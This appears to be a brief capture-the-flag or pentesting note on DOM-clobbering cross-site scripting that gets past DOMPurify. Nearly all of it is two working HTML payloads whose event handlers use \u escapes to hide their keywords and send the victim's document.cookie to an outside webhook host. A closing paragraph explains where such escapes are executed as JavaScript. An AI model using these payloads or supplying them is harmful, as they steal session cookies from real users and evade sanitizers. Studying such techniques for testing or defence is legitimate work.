https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html#dom-clobbering

Because DOMPurify allow us to use `<a>` tag so we can use `<a>` tag for dom clobbering

Using https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
```html
<a id="set"></a><style>@keyframes x{from{opacity:0}to{opacity:1}}</style><div style="animation:x 1ms" onanimationend="new \u0049mage().src='https://7919e7ff-57d1-409b-bf9a-882ffa3c8bbe.webhooksite.net/?c='.concat(document.\u0063ookie)"></div>
```
```html
<a id="set"></a><style oncontentvisibilityautostatechange="new \u0049mage().src='https://7919e7ff-57d1-409b-bf9a-882ffa3c8bbe.webhooksite.net/?c='.concat(document.\u0063ookie)" style=display:block;content-visibility:auto>
```

The JavaScript \uXXXX escape technique only works when the string is interpreted as JavaScript by the browser. In HTML, that means it must be inside a JavaScript context such as:

- an event handler attribute value (e.g. onanimationend="...", onclick="...")

- a `<script> block`

- a `javascript: URL`

It does not work in plain HTML text, in non‑JS attributes like id or href (unless it’s a javascript: URI), or as an HTML entity. HTML entities use &...; syntax and are processed by the HTML parser, not the JS engine.